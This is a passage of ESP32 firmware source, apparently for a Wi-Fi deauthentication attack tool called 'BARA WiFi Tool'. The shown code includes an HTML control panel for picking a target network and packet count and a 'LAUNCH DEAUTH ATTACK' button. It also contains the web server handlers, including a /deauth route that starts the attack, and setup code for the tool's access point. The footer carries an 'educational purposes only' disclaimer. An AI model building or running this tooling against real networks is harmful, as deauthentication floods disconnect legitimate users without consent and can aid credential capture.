                    <div class="status-value" id="currentTime">--:--:--</div>
                </div>
            </div>
            
            <div class="controls">
                <div class="control-group">
                    <h3 class="control-title">SCANNER CONTROLS</h3>
                    <div class="buttons">
                        <button id="scanBtn" class="btn btn-primary" onclick="startScan()">
                            <span style="margin-right:10px;">📡</span> START WI-FI SCAN
                        </button>
                        <button class="btn btn-success" onclick="updateNetworksList()">
                            <span style="margin-right:10px;">🔄</span> REFRESH NETWORKS
                        </button>
                        <button class="btn" onclick="executeCommand('clear')" style="background:#333;color:#fff;">
                            <span style="margin-right:10px;">🧹</span> CLEAR TERMINAL
                        </button>
                    </div>
                </div>
            </div>
            
            <div class="networks-container">
                <h3 class="control-title" style="margin-top:0;">DETECTED NETWORKS</h3>
                <table class="network-table">
                    <thead>
                        <tr>
                            <th>SSID</th>
                            <th>BSSID</th>
                            <th>CH</th>
                            <th>AUTH</th>
                            <th>STRENGTH</th>
                            <th>CLIENTS</th>
                            <th>ACTION</th>
                        </tr>
                    </thead>
                    <tbody id="networksTable">
                        <!-- Networks will be populated here -->
                    </tbody>
                </table>
            </div>
            
            <div class="attack-controls">
                <h3 class="control-title">ATTACK CONTROLS</h3>
                <div class="form-group">
                    <label class="form-label">SELECT TARGET NETWORK:</label>
                    <select id="networkSelect" class="form-input">
                        <option value="-1">Select a network</option>
                    </select>
                </div>
                <div class="form-group">
                    <label class="form-label">NUMBER OF PACKETS:</label>
                    <input type="range" id="packets" class="form-input" min="10" max="1000" value="100">
                    <div style="color:var(--terminal-green);margin-top:5px;">
                        Packets: <span id="packetsValue">100</span>
                    </div>
                </div>
                <div class="buttons">
                    <button id="attackBtn" class="btn btn-danger" onclick="startDeauth()">
                        <span style="margin-right:10px;">⚡</span> LAUNCH DEAUTH ATTACK
                    </button>
                    <button class="btn" onclick="stopDeauth()" style="background:#444;color:#fff;">
                        <span style="margin-right:10px;">⏹️</span> STOP ATTACK
                    </button>
                </div>
            </div>
            
            <div class="controls">
                <h3 class="control-title">SYSTEM TERMINAL</h3>
                <div class="terminal" id="terminal"></div>
                <input type="text" id="terminalInput" class="form-input" placeholder="Type command here (e.g., 'help')">
            </div>
            
            <div class="footer">
                <p>)rawliteral";
    html += TOOL_NAME;
    html += R"rawliteral( Ultimate WiFi Tool v)rawliteral";
    html += VERSION;
    html += R"rawliteral( | Developed by )rawliteral";
    html += DEVELOPER;
    html += R"rawliteral(</p>
                <p>For educational purposes only | Use responsibly</p>
                <p style="color:var(--blood-red);font-size:0.8em;margin-top:10px;">
                    ⚠️ WARNING: This tool may be illegal to use against networks you don't own
                </p>
            </div>
        </div>
        
        <script>
            // Update packets value display
            document.getElementById('packets').addEventListener('input', function() {
                document.getElementById('packetsValue').textContent = this.value;
            });
            
            // Initialize matrix rain
            window.onload = function() {
                const canvas = document.getElementById('matrixCanvas');
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
            };
        </script>
    </body>
    </html>
    )rawliteral";
    
    return html;
}

// ============= مسارات الخادم =============
void handleRoot() {
    server.send(200, "text/html", getHTML());
}

void handleScan() {
    startScan();
    server.send(200, "application/json", "{\"status\":\"scan_started\"}");
}

void handleNetworks() {
    server.send(200, "application/json", networksJson);
}

void handleDeauth() {
    if(server.hasArg("target") && server.hasArg("packets")) {
        int target = server.arg("target").toInt();
        int packets = server.arg("packets").toInt();
        startDeauth(target, packets);
        server.send(200, "application/json", "{\"status\":\"attack_started\"}");
    } else {
        server.send(400, "application/json", "{\"error\":\"missing_parameters\"}");
    }
}

void handleStop() {
    stopDeauth();
    server.send(200, "application/json", "{\"status\":\"attack_stopped\"}");
}

void handleStatus() {
    String json = "{";
    json += "\"scanning\":" + String(isScanning ? "true" : "false") + ",";
    json += "\"deauthing\":" + String(isDeauthing ? "true" : "false") + ",";
    json += "\"networks\":" + String(totalNetworks) + ",";
    json += "\"version\":\"" + String(VERSION) + "\"";
    json += "}";
    server.send(200, "application/json", json);
}

// ============= الإعداد =============
void setup() {
    Serial.begin(115200);
    delay(1000);
    
    // تهيئة المسامير
    pinMode(BUZZER_PIN, OUTPUT);
    pinMode(LED_RED, OUTPUT);
    pinMode(LED_GREEN, OUTPUT);
    pinMode(LED_BLUE, OUTPUT);
    
    // إعداد PWM للمؤثرات الصوتية
    ledcSetup(0, 2000, 8);
    ledcAttachPin(BUZZER_PIN, 0);
    
    // مؤثرات بداية التشغيل
    Serial.println("\n\n");
    Serial.println("╔══════════════════════════════════════════════════════════╗");
    Serial.println("║                   BARA WiFi Tool v2.0.0                  ║");
    Serial.println("║         Developed by Ahmed Nour Ahmed - Qena            ║");
    Serial.println("╚══════════════════════════════════════════════════════════╝");
    Serial.println("\nInitializing system...");
    
    playSound(SOUND_STARTUP);
    
    // مؤثرات LED عند البدء
    setLED(1, 0, 0); delay(200);
    setLED(0, 1, 0); delay(200);
    setLED(0, 0, 1); delay(200);
    setLED(1, 1, 1); delay(500);
    setLED(0, 0, 0);
    
    // إنشاء نقطة اتصال
    Serial.println("Creating access point...");
    WiFi.softAP(AP_SSID, AP_PASSWORD);
    Serial.println("Access Point Created!");
    Serial.print("SSID: ");
    Serial.println(AP_SSID);
    Serial.print("Password: ");
    Serial.println(AP_PASSWORD);
    Serial.print("IP Address: ");
    Serial.println(WiFi.softAPIP());
    
    // تسجيل mDNS
    if(!MDNS.begin("bara")) {
        Serial.println("Error setting up MDNS responder!");
    } else {
        Serial.println("mDNS responder started: bara.local");
    }
    
    // إعداد مسارات الخادم
    server.on("/", handleRoot);
    server.on("/scan", handleScan);
    server.on("/networks", handleNetworks);
    server.on("/deauth", handleDeauth);
    server.on("/stop", handleStop);
    server.on("/status", handleStatus);
    
    // بدء الخادم
    server.begin();
    Serial.println("HTTP server started");
    
    // مسح أولي للشبكات
    startScan();
    
    Serial.println("\nSystem ready!");
    Serial.println("Connect to WiFi network: " + String(AP_SSID));
    Serial.println("Open browser and go to: http://" + WiFi.softAPIP().toString());
    Serial.println("Or: http://bara.local");
}

// ============= الحلقة الرئيسية =============
void loop() {
    server.handleClient();
    
    // مؤثرات LED متقطعة
    static unsigned long lastLedUpdate = 0;
    if(millis() - lastLedUpdate > 1000) {
        if(isScanning) {
            setLED(0, 1, 0);
            delay(50);
            setLED(0, 0, 0);
        } else if(isDeauthing) {
            setLED(1, 0, 0);
            delay(50);
            setLED(0, 0, 0);
        } else {
            setLED(0, 0, 1);
            delay(50);
            setLED(0, 0, 0);
        }
        lastLedUpdate = millis();
    }
    
    delay(10);
}
